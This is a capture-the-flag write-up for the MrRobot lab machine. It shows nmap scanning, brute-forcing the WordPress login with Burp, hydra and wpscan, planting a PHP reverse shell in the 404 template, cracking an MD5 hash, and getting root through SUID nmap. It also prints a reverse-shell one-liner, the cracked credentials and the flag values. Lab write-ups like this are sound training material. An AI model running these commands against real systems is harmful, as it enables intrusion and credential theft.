# MrRobot
Solved without using Metasploit 

Host Discovery Scanning 

```
sudo nmap -sn -oN hosts.txt 192.168.69.0/24
[sudo] password for voidgojo: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 09:37 CDT
Nmap scan report for 192.168.69.1
Host is up (0.00014s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.69.2
Host is up (0.00011s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.69.3
Host is up (0.00012s latency).
MAC Address: 08:00:27:7B:80:2C (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.10                        <<<<<<<<<<<<<<<<<<<<<
Host is up (0.00017s latency).
MAC Address: 08:00:27:16:C1:89 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.5
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.10 seconds

```

The machine was running on `192.168.69.10` , site was so interactive 

<img src="./img/Pasted image 20240626201108.png" alt="Example Image" width="1080"/>

<img src="./img/Pasted image 20240626201117.png" alt="Example Image" width="1080"/>

<img src="./img/Pasted image 20240626201126.png" alt="Example Image" width="1080"/>

<img src="./img/Pasted image 20240626201139.png" alt="Example Image" width="1080"/>

Full Scanning 

```
sudo nmap -A -T4 -oN full_scan.txt 192.168.69.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 09:46 CDT
Nmap scan report for 192.168.69.10
Host is up (0.00021s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
MAC Address: 08:00:27:16:C1:89 (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.9 (94%), Linux 3.2 - 3.8 (93%), Linux 3.13 or 4.2 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.18 (92%), Linux 3.13 (91%), Linux 3.16 - 4.6 (91%), Linux 2.6.26 - 2.6.35 (91%)
No exact OS matches for host (test conditions non-ideal).
```

Nikto Scanning 

```
sudo nikto -host http://192.168.69.10 > nikto_scan.txt
```

<img src="./img/Pasted image 20240626202441.png" alt="Example Image" width="1080"/>

we know its running WordPress , let see robots.txt 

<img src="./img/Pasted image 20240626202052.png" alt="Example Image" width="1080"/>

we got our first flag , remaining two flag are there , and also got a dictionary file 

```
 cat key-1-of-3.txt                                   
073403c8a58a1f80d943455fb30724b9

fsocity.dic is word list
cat fsocity.dic | sort -u | uniq > wordlist.txt
```

http://192.168.69.10/wp-login.php , we got a word press login , so let brute force 

Open Burp suite , fill test and test in intercept  , send to intruder for attacking 

```
log=Elliot&pwd=&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.69.10%2Fwp-admin%2F&testcookie=1
```

<img src="./img/Pasted image 20240626203447.png" alt="Example Image" width="1080"/>

fgo to payloads and Load `fsociety.dic` 

<img src="./img/Pasted image 20240626203615.png" alt="Example Image" width="1080"/>

Start the attack

<img src="./img/Pasted image 20240626203733.png" alt="Example Image" width="1080"/>

sort the response and the response Elliot and Robot are different. click show response in browser 

<img src="./img/Pasted image 20240626204154.png" alt="Example Image" width="1080"/>

<img src="./img/Pasted image 20240626204230.png" alt="Example Image" width="1080"/>


We got user Eliot correct  but password was wrong, let brute force password  but using hydra , because burp intruder as slow

```
log=Elliot&pwd=&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.69.10%2Fwp-admin%2F&testcookie=1
```

from these parameter modify this for hydra http-post-form 

```
sudo hydra -vV -l Elliot -P wordlist.txt 192.168.69.10 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

but there are response was correct, we able to identify the correct one among many ,  `wpscan` has a user and password options use that 

```
└─# wpscan --url 192.168.69.10 --passwords wordlist.txt --usernames Elliot
```

<img src="./img/Pasted image 20240626210749.png" alt="Example Image" width="1080"/>
we got the credentials 

```
Username: Elliot, Password: ER28-0652
```

<img src="./img/Pasted image 20240626210913.png" alt="Example Image" width="1080"/>

Let find php reverse shell ,

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

download that file using `wget`

```
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
gunzip php-reverse-shell-1.0.tar.gz                                                                             
tar -xvf php-reverse-shell-1.0.tar 

php-reverse-shell-1.0/
php-reverse-shell-1.0/COPYING.GPL
php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
php-reverse-shell-1.0/php-reverse-shell.php
php-reverse-shell-1.0/CHANGELOG

```

 404.Template Location : Dashboard --> Appearance  -->  Editor --> 404 Templates

copy those php file and modify ip and port our machine , paste in 404.Template , then update ,  start the listener  , use curl `http://192.168.69.10/404.php` to  trigger that reverse shell file  

```
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.69.5] from (UNKNOWN) [192.168.69.10] 56242
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 16:26:49 up 11 min,  0 users,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('bin/bash');"
daemon@linux:/$ 
```

we got the shell and switch to bash using python 

```
cd /home/robot
ls
key-2-of-3.txt	password.raw-md5
cat key-2-of-3.txt: Permission denied
robot:c3fcd3d76192e4007dfb496cca67e13b

```

we got the 2nd flag but permission denied , and also got password in MD5  https://www.tunnelsup.com/hash-analyzer/ 

https://crackstation.net/
<img src="./img/Pasted image 20240626221054.png" alt="Example Image" width="1080"/>


Also used hashcat , 

```
hashcat.exe -m 0 -a 0 "c3fcd3d76192e4007dfb496cca67e13b" .\wordlist\rockyou.txt
```

https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

<img src="./img/Pasted image 20240626221835.png" alt="Example Image" width="1080"/>

switching to robot user 

```
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

and got 2nd flag , let explore for root suit programs in the machine 

```
find / -perm -4000 -type f 2>/dev/null
```

user local has a `nmap`  

<img src="./img/Pasted image 20240626220347.png" alt="Example Image" width="1080"/>

searched got a command to get the root shell from gtfobins 

https://gtfobins.github.io/gtfobins/nmap/#suid\

```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh 
```

got the root shell 

<img src="./img/Pasted image 20240626221409.png" alt="Example Image" width="1080"/>

we have pwned the machine and , got the last flag

```
cd /root
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
